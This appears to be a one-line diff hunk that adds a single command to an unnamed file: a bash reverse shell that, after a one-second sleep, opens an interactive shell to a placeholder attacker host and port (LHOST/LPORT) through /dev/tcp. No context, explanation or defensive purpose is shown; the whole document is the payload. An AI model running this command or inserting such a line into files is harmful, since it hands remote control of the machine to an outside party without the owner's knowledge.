@@ -1,0 +1,1 @@
+sleep 1; bash -i >& /dev/tcp/LHOST/LPORT 0>&1
